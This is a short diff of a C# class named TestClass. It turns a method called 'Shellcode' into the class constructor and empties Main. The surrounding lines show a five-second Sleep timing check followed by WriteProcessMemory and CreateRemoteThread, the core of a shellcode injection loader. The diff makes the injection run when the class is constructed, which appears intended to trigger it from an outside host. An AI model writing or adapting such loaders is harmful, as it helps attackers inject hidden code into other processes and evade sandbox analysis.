@@ -30,7 +30,7 @@ public class TestClass
 	static extern IntPtr GetCurrentProcess();
 	
 	
-	public void Shellcode()
+	public TestClass()
 	{
 		DateTime t1 = DateTime.Now;
 		Sleep(5000);
@@ -60,10 +60,10 @@ public class TestClass
 		WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
 		IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
 	}
-	public static void Main()
-	{
-		var testClass = new TestClass();
-		testClass.Shellcode();
-	}
+	
+	[STAThread]
+        static void Main()
+        {
+        }
 }
 }
